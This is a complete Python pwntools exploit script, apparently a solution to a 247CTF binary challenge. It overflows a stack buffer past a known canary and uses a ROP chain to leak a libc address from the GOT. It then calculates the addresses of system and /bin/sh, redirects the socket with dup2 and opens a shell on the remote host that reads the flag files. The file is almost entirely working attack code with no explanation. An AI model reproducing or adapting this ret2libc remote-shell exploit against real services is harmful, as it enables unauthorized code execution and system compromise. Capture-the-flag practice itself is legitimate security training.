#!/usr/bin/env python3
from pwn import *
import time

HOST = "0b1e1d5f8b809485.247ctf.com"
PORT = 50428

CANARY_OFFSET = 512
KNOWN_CANARY = p32(0xafcc5b00)

# Binary
send_plt = 0x080485c0
exit_plt = 0x08048520
send_got = 0x0804a048
libc_start_main_got = 0x0804a028
pop4_ret = 0x08048a68
pop3_ret = 0x08048a69

# libc6-i386_2.27-3ubuntu1_amd64 offsets from libc.rip
LIBC_START_MAIN_OFF = 0x18d90
SYSTEM_OFF = 0x3cd10
BINSH_OFF = 0x17b8cf
DUP2_OFF = 0xe6110

def leak_got(canary, socket_fd, got_addr):
    r = remote(HOST, PORT, timeout=10, level='error')
    time.sleep(0.2)
    r.recv(timeout=2)
    rop = p32(send_plt) + p32(pop4_ret) + p32(socket_fd) + p32(got_addr) + p32(4) + p32(0) + p32(exit_plt)
    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)
    time.sleep(1)
    try:
        data = r.recv(timeout=3)
        r.close()
        if b"Incorrect" in data:
            idx = data.find(b"Incorrect secret password:\n")
            leaks = data[idx + len(b"Incorrect secret password:\n"):]
            if len(leaks) >= 4:
                return u32(leaks[:4])
        elif len(data) >= 4:
            return u32(data[:4])
    except:
        pass
    return None

def exploit():
    context.log_level = 'info'
    context.arch = 'i386'

    canary = KNOWN_CANARY
    socket_fd = 4

    log.success(f"Using known canary: 0x{u32(canary):08x}")

    # Leak __libc_start_main
    log.info("Leaking __libc_start_main...")
    libc_start_addr = leak_got(canary, socket_fd, libc_start_main_got)
    log.success(f"__libc_start_main@libc: 0x{libc_start_addr:08x}")

    # Calculate addresses
    libc_base = libc_start_addr - LIBC_START_MAIN_OFF
    system = libc_base + SYSTEM_OFF
    binsh = libc_base + BINSH_OFF
    dup2 = libc_base + DUP2_OFF

    log.success(f"libc_base = 0x{libc_base:08x}")
    log.success(f"system = 0x{system:08x}")
    log.success(f"dup2 = 0x{dup2:08x}")
    log.success(f"/bin/sh = 0x{binsh:08x}")

    # Final exploit
    log.info("=== Sending final payload ===")
    r = remote(HOST, PORT, timeout=15)
    time.sleep(0.2)
    r.recv(timeout=2)

    # ROP: dup2(4,0) + dup2(4,1) + system("/bin/sh")
    rop = b""
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(0) + p32(0)
    rop += p32(dup2) + p32(pop3_ret) + p32(socket_fd) + p32(1) + p32(0)
    rop += p32(system) + p32(exit_plt) + p32(binsh)

    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)

    time.sleep(1)
    log.info("Sending commands...")
    r.sendline(b"cat flag* /flag* 2>/dev/null; id")

    time.sleep(1)
    try:
        response = r.recv(timeout=3)
        log.success(f"Response: {response}")
    except:
        pass

    r.interactive()

if __name__ == "__main__":
    exploit()
